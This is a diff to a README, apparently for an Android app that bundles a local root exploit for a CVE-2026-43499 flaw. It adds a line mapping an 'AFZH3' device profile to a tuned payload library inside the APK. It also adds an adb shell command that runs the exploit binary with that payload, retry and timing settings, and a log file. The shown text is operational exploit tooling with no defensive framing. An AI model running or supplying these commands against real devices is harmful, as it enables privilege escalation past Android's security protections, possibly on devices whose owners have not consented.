@@ -17,6 +17,10 @@ APK output:
 app/build/outputs/apk/debug/app-debug.apk
 ```
 
+The AFZH3 profile in this APK selects
+`app/src/main/assets/cve-2026-43499-app-afzh3-tuned.so`. The AFZG1 profile
+continues to select its existing payload.
+
 Manual Gradle build:
 
 ```sh
@@ -77,6 +81,12 @@ This does:
 ```
 
 ## Manual ADB Test Commands
+
+AFZH3 tuned POC:
+
+```sh
+adb shell 'EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=60 PSELECT_DELAY_USEC=20000 /data/local/tmp/rmg-afzh3/libcve43499root-afzh3 --run-payload /data/local/tmp/rmg-afzh3/cve-2026-43499-app-afzh3-tuned.so /data/local/tmp/rmg-afzh3/libcve43499root-afzh3 /data/local/tmp/rmg-afzh3/exploit.log'
+```
 
 Run one attempt and write the log:
 
